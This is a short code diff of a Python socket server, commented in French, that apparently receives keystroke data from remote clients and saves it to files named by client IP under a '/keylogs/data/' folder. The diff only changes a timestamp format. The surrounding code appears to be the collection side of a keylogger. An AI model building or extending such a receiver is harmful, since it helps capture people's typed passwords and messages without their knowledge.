@@ -74,12 +74,12 @@ def receiver(port):
     print(f"Ecoute sur {SRV}:{port}")
 
     time = datetime.datetime.now().time()
-    f_time = time.strftime("%H-%M-%S")
+    f_time = time.strftime("%Hh%M")
 
     while True:
         client_socket, client_address = server_socket.accept()
         ficname = f"{client_address[0]}-{datetime.date.today()}-{f_time}-keyboard.txt"
-        
+
         # recu data
         with open("/keylogs/data/" + ficname, "a") as f:
             data = client_socket.recv(1024)
